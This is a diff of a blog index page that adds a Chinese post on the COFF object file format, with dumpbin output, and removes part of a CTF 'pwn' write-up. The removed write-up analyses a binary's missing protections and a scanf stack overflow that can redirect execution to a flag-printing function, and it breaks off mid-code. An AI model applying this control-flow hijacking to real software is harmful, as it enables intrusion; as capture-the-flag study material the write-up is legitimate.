@@ -167,6 +167,148 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-chapter-5-COFF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-chapter-5-COFF/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 5 COFF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-08-11 14:55:00" itemprop="dateCreated datePublished" datetime="2022-08-11T14:55:00+08:00">2022-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-08-18 10:14:33" itemprop="dateModified" datetime="2022-08-18T10:14:33+08:00">2022-08-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="COFF文件格式"><a href="#COFF文件格式" class="headerlink" title="COFF文件格式"></a>COFF文件格式</h1><h2 id="COFF"><a href="#COFF" class="headerlink" title="COFF"></a>COFF</h2><p>common object file format</p>
+<p>文件整体结构如图</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220811105858318.png" alt="image-20220811105858318"></p>
+<h3 id="映像文件头"><a href="#映像文件头" class="headerlink" title="映像文件头"></a>映像文件头</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">  WORD Machine;</span><br><span class="line">  WORD NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD SizeOfOptionalHeader;</span><br><span class="line">  WORD Characteristics;</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
+
+<p>与PE文件有区别</p>
+<p>在PE文件中映像文件头就是NT文件头,它是PE头的成员NT头的成员</p>
+<p>而在COFF中上来就是镜像文件头</p>
+<p>使用dumpbin观察main.obj文件的映像文件头</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Dump of file main.obj</span><br><span class="line"></span><br><span class="line">File <span class="built_in">Type</span>: COFF OBJECT</span><br><span class="line"></span><br><span class="line">FILE HEADER VALUES</span><br><span class="line">            <span class="number">8664</span> machine (x64)</span><br><span class="line">               E number of sections</span><br><span class="line">        <span class="number">62</span>F46FCA time date stamp Thu Aug <span class="number">11</span> <span class="number">10</span>:<span class="number">56</span>:<span class="number">10</span> <span class="number">2022</span></span><br><span class="line">             <span class="number">4</span>E5 file pointer to symbol table</span><br><span class="line">              <span class="number">30</span> number of symbols</span><br><span class="line">               <span class="number">0</span> size of optional header</span><br><span class="line">               <span class="number">0</span> characteristics</span><br></pre></td></tr></table></figure>
+
+<p>x86_64上的程序</p>
+<p>14个节</p>
+<p>编译时间2022.8.11 10:56:10</p>
+<p>符号表的文件偏移量4E5</p>
+<p>符号数量30h</p>
+<p>可选头没有,PE中才有,COFF中永远都是0</p>
+<p>特征没有</p>
+<h3 id="节头表"><a href="#节头表" class="headerlink" title="节头表"></a>节头表</h3><p>节头表是一个结构体数组,每个元素都是一个<code>IMAGE_SECTION_HEADER</code>结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">     BYTE Name[IMAGE_SIZEOF_SHORT_NAME];<span class="comment">//节名</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">//联合</span></span><br><span class="line">DWORD PhysicalAddress;<span class="comment">//本段在文件中的地址</span></span><br><span class="line">DWORD VirtualSize;<span class="comment">//本段在虚拟内存中的大小</span></span><br><span class="line">     &#125; Misc;</span><br><span class="line">     DWORD VirtualAddress;<span class="comment">//相对虚拟地址</span></span><br><span class="line">     DWORD SizeOfRawData;<span class="comment">//该段在文件中的大小</span></span><br><span class="line">     DWORD PointerToRawData;<span class="comment">//该段在文件中的位置</span></span><br><span class="line">     DWORD PointerToRelocations;<span class="comment">//该段的重定位表在文件中的位置</span></span><br><span class="line">     DWORD PointerToLinenumbers;<span class="comment">//该段的行号表在文件中的位置</span></span><br><span class="line">     WORD NumberOfRelocations;</span><br><span class="line">     WORD NumberOfLinenumbers;</span><br><span class="line">     DWORD Characteristics;<span class="comment">//段属性,包括读写执行等性质</span></span><br><span class="line">   &#125; IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
+
+<p>这个表有多少个元素呢?在映像文件头中的<code>NumberOfSections</code>指明了节头表的元素数量</p>
+<h4 id="drectve"><a href="#drectve" class="headerlink" title=".drectve"></a>.drectve</h4><p>比如第一个节区头就是<code>.drectve</code>的节区头</p>
+<p>Directive,编译器传递给链接器的指令,作用和在命令行上link直接指定命令行参数相同</p>
+<p>只不过这样写可以给每个目标模块定制一套链接参数,link的时候不需要再写一长串命令行参数了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER <span class="comment">#1</span></span><br><span class="line">.drectve name</span><br><span class="line">       <span class="number">0</span> physical address</span><br><span class="line">       <span class="number">0</span> virtual address</span><br><span class="line">      <span class="number">18</span> size of raw <span class="keyword">data</span></span><br><span class="line">     <span class="number">244</span> file pointer to raw <span class="keyword">data</span> (<span class="number">00000244</span> to <span class="number">0000025</span>B)</span><br><span class="line">       <span class="number">0</span> file pointer to relocation table</span><br><span class="line">       <span class="number">0</span> file pointer to line numbers</span><br><span class="line">       <span class="number">0</span> number of relocations</span><br><span class="line">       <span class="number">0</span> number of line numbers</span><br><span class="line">  <span class="number">100</span>A00 flags</span><br><span class="line">         Info   <span class="comment">#0x200,该段包含的是注释或者其他信息</span></span><br><span class="line">         Remove		<span class="comment">#0x800,链接成exe文件时该段最终被抛弃</span></span><br><span class="line">         <span class="number">1</span> byte align	<span class="comment">#0x100000,1字节对齐,相当于没有对齐要求</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h4><p>调试信息</p>
+<p>.debug$S表示包含符号相关的调试信息段</p>
+<p>.debug$P表示预编译头的调试信息段</p>
+<p>.debug$T表示类型相关的调试信息段</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER <span class="comment">#2</span></span><br><span class="line">.debug<span class="variable">$S</span> name</span><br><span class="line">       <span class="number">0</span> physical address</span><br><span class="line">       <span class="number">0</span> virtual address</span><br><span class="line">      <span class="number">74</span> size of raw <span class="keyword">data</span></span><br><span class="line">     <span class="number">11</span>C file pointer to raw <span class="keyword">data</span> (<span class="number">0000011</span>C to <span class="number">0000018</span>F)</span><br><span class="line">       <span class="number">0</span> file pointer to relocation table</span><br><span class="line">       <span class="number">0</span> file pointer to line numbers</span><br><span class="line">       <span class="number">0</span> number of relocations</span><br><span class="line">       <span class="number">0</span> number of line numbers</span><br><span class="line"><span class="number">42100040</span> flags</span><br><span class="line">         Initialized <span class="keyword">Data</span></span><br><span class="line">         Discardable</span><br><span class="line">         <span class="number">1</span> byte align</span><br><span class="line">         Read Only</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="节区"><a href="#节区" class="headerlink" title="节区"></a>节区</h3><p>节区紧跟在节头表后面,也就是正文部分</p>
+<p>使用dumpbin观察节区数量</p>
+<h4 id="drectve-1"><a href="#drectve-1" class="headerlink" title=".drectve"></a>.drectve</h4><p>第一个节区就是链接指示信息节区,节区表指示该节区正文位于文件的0x244位置</p>
+<p>dumpbin打印的结果中,正文区是紧跟在节头后面的</p>
+<p>dumpbin知道这个段是关于链接信息的段,它直接把ASCII码翻译出来了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAW DATA #1</span><br><span class="line">  00000000: 20 20 20 2F 44 45 46 41 55 4C 54 4C 49 42 3A 22     /DEFAULTLIB:&quot;</span><br><span class="line">  00000010: 4C 49 42 43 4D 54 22 20                          LIBCMT&quot; </span><br><span class="line"></span><br><span class="line">   Linker Directives</span><br><span class="line">   -----------------</span><br><span class="line">   /DEFAULTLIB:LIBCMT</span><br></pre></td></tr></table></figure>
+
+<p>就相当于在链接时使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link main.obj /DEFAULTLIB:LIBCMT</span><br></pre></td></tr></table></figure>
+
+<p>这也就解释了为啥我们没有显示链接LIBCMT库但是编译器自动要求链接这个库,默认的链接信息已经写入main.obj的.drectve节了</p>
+<h4 id="debug-1"><a href="#debug-1" class="headerlink" title=".debug"></a>.debug</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAW DATA #2</span><br><span class="line">  00000000: 04 00 00 00 F1 00 00 00 66 00 00 00 28 00 01 11  ....?..f...(...</span><br><span class="line">  00000010: 00 00 00 00 43 3A 5C 55 73 65 72 73 5C 38 36 31  ....C:\Users\861</span><br><span class="line">  00000020: 33 35 5C 64 65 73 6B 74 6F 70 5C 6C 69 6E 6B 5C  35\desktop\link\</span><br><span class="line">  00000030: 61 2E 6F 62 6A 00 3A 00 3C 11 00 62 00 00 D0 00  a.obj.:.&lt;..b..?</span><br><span class="line">  00000040: 13 00 1F 00 82 79 02 00 13 00 1F 00 82 79 02 00  .....y.......y..</span><br><span class="line">  00000050: 4D 69 63 72 6F 73 6F 66 74 20 28 52 29 20 4F 70  Microsoft (R) Op</span><br><span class="line">  00000060: 74 69 6D 69 7A 69 6E 67 20 43 6F 6D 70 69 6C 65  timizing Compile</span><br><span class="line">  00000070: 72 00 00 00</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">COFF SYMBOL TABLE</span><br><span class="line"><span class="number">000</span> <span class="number">01047982</span> ABS    notype       <span class="keyword">Static</span>       | @comp.id</span><br><span class="line"><span class="number">001</span> <span class="number">80010190</span> ABS    notype       <span class="keyword">Static</span>       | @feat.<span class="number">00</span></span><br><span class="line"><span class="number">002</span> <span class="number">00000002</span> ABS    notype       <span class="keyword">Static</span>       | @vol.md</span><br><span class="line"><span class="number">003</span> <span class="number">00000000</span> SECT1  notype       <span class="keyword">Static</span>       | .drectve</span><br><span class="line">    Section length   <span class="number">18</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br><span class="line"><span class="number">005</span> <span class="number">00000000</span> SECT2  notype       <span class="keyword">Static</span>       | .debug<span class="variable">$S</span></span><br><span class="line">    Section length   <span class="number">74</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br><span class="line"><span class="number">007</span> <span class="number">00000000</span> SECT3  notype       <span class="keyword">Static</span>       | .text<span class="variable">$mn</span></span><br><span class="line">    Section length   <span class="number">24</span>, <span class="comment">#relocs    2, #linenums    0, checksum 9B262C10</span></span><br><span class="line"><span class="number">009</span> <span class="number">00000000</span> SECT3  notype ()    External     | main</span><br><span class="line"><span class="number">00</span>A <span class="number">00000000</span> UNDEF  notype ()    External     | swap</span><br><span class="line"><span class="number">00</span>B <span class="number">00000000</span> SECT3  notype       Label        | <span class="variable">$LN3</span></span><br><span class="line"><span class="number">00</span>C <span class="number">00000000</span> SECT4  notype       <span class="keyword">Static</span>       | .xdata</span><br><span class="line">    Section length    <span class="number">8</span>, <span class="comment">#relocs    0, #linenums    0, checksum 37887F31</span></span><br><span class="line"><span class="number">00</span>E <span class="number">00000000</span> SECT4  notype       <span class="keyword">Static</span>       | <span class="variable">$unwind</span><span class="variable">$main</span></span><br><span class="line"><span class="number">00</span>F <span class="number">00000000</span> SECT5  notype       <span class="keyword">Static</span>       | .pdata</span><br><span class="line">    Section length    C, <span class="comment">#relocs    3, #linenums    0, checksum 7D3C6CAC</span></span><br><span class="line"><span class="number">011</span> <span class="number">00000000</span> SECT5  notype       <span class="keyword">Static</span>       | <span class="variable">$pdata</span><span class="variable">$main</span></span><br><span class="line"><span class="number">012</span> <span class="number">00000000</span> UNDEF  notype       External     | shared</span><br><span class="line"><span class="number">013</span> <span class="number">00000000</span> SECT6  notype       <span class="keyword">Static</span>       | .chks64</span><br><span class="line">    Section length   <span class="number">30</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>最左侧是符号的编号,也就是符号在符号表中的下标,</p>
+<p>第二列是符号的大小,即符号所表示的对象占用的空间</p>
+<p>第三列是符号所在段位置</p>
+<blockquote>
+<p>ABS表示符号不属于任何段</p>
+<p>SECT1表示符号属于COFF文件的第一个段,即.drectve段</p>
+<p>UNDEF表示符号未定义,存在于其他文件,需要链接决议</p>
+</blockquote>
+<p>第四列是符号类型</p>
+<blockquote>
+<p>notype:变量和其他符号</p>
+<p>notype():函数类型</p>
+</blockquote>
+<p>第五列是访问能见度</p>
+<blockquote>
+<p>Static为本模块可见</p>
+<p>Externel为全局变量,可以被其他模块引用</p>
+</blockquote>
+<p>第六列是符号名</p>
+<p>如果符号是一个段名则dumpbin会紧接着在下一行列出段属性,包括段长度,段重定位数,行号数和检校和</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h3><h4 id="cl-c-编译不链接"><a href="#cl-c-编译不链接" class="headerlink" title="cl &#x2F;c 编译不链接"></a>cl &#x2F;c 编译不链接</h4><h4 id="cl-Za-禁用Visual-C-拓展"><a href="#cl-Za-禁用Visual-C-拓展" class="headerlink" title="cl &#x2F;Za 禁用Visual C++拓展"></a>cl &#x2F;Za 禁用Visual C++拓展</h4><h4 id="cl-Zl-关闭默认C库的链接"><a href="#cl-Zl-关闭默认C库的链接" class="headerlink" title="cl &#x2F;Zl 关闭默认C库的链接"></a>cl &#x2F;Zl 关闭默认C库的链接</h4><h3 id="dumpbin"><a href="#dumpbin" class="headerlink" title="dumpbin"></a>dumpbin</h3><p>类似于GNU objdump</p>
+<h4 id="dumpbin-SUMMARY-打印段名段长"><a href="#dumpbin-SUMMARY-打印段名段长" class="headerlink" title="dumpbin &#x2F;SUMMARY 打印段名段长"></a>dumpbin &#x2F;SUMMARY 打印段名段长</h4><h4 id="dump-ALL-打印全部信息"><a href="#dump-ALL-打印全部信息" class="headerlink" title="dump &#x2F;ALL 打印全部信息"></a>dump &#x2F;ALL 打印全部信息</h4><p>效果类似于010editor 的模板</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/08/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -5827,183 +5969,6 @@
 
 
 
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/" class="post-title-link" itemprop="url">xctf攻防世界-pwn-高手村</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-06-20 00:27:00 / Modified: 00:27:57" itemprop="dateCreated datePublished" datetime="2022-06-20T00:27:00+08:00">2022-06-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="xctf-攻防世界-pwn高手村"><a href="#xctf-攻防世界-pwn高手村" class="headerlink" title="xctf-攻防世界-pwn高手村"></a>xctf-攻防世界-pwn高手村</h1><h2 id="forgot-On2022-6-19"><a href="#forgot-On2022-6-19" class="headerlink" title="forgot (On2022.6.19)"></a>forgot (On2022.6.19)</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619234811216.png" alt="image-20220619234811216"></p>
-<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/forgot]</span><br><span class="line">└─$ checksec forgot</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/forgot/forgot&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>没有金丝雀,没有地址随机化.</p>
-<p>只有堆栈不可执行保护</p>
-<h3 id="Strings视图"><a href="#Strings视图" class="headerlink" title="Strings视图"></a>Strings视图</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619191536296.png" alt="image-20220619191536296"></p>
-<p>有<code>cat</code>,<code>flag</code>字样,前往其所在的函数看看</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80486CC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">58</span>]; <span class="comment">// [esp+1Eh] [ebp-3Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x32</span>u, <span class="string">&quot;cat %s&quot;</span>, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>显然只需要调用该函数就可以获取flag,该函数的起始地址是<code>0x80486CC</code>,然而该函数的Function calls视图中没有调用者,即对该函数的调用要通过站缓冲区溢出修改函数返回地址实现</p>
-<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">10</span>]; <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+58h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = sub_8048604;<span class="comment">//sub_8048604是一个函数,这里没写函数括号,说明v3[0]只是存放函数地址,并不调用函数</span></span><br><span class="line">  v3[<span class="number">1</span>] = sub_8048618;</span><br><span class="line">  v3[<span class="number">2</span>] = sub_804862C;</span><br><span class="line">  v3[<span class="number">3</span>] = sub_8048640;</span><br><span class="line">  v3[<span class="number">4</span>] = sub_8048654;</span><br><span class="line">  v3[<span class="number">5</span>] = sub_8048668;</span><br><span class="line">  v3[<span class="number">6</span>] = sub_804867C;</span><br><span class="line">  v3[<span class="number">7</span>] = sub_8048690;</span><br><span class="line">  v3[<span class="number">8</span>] = sub_80486A4;</span><br><span class="line">  v3[<span class="number">9</span>] = sub_80486B8;<span class="comment">//该函数打印了&quot;You just made it. But then you didn&#x27;t!&quot;,看样子是目标函数</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;</span>, sub_8048654);<span class="comment">//将sub_8048654函数的地址打印出来</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the string to be validate&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v2);<span class="comment">//scanf获取输入,存在栈缓冲区溢出,v2可以溢出</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )<span class="comment">//会根据v2[i]来决定会不会修改v5</span></span><br><span class="line">          v5 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v5 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v5 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v5 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = 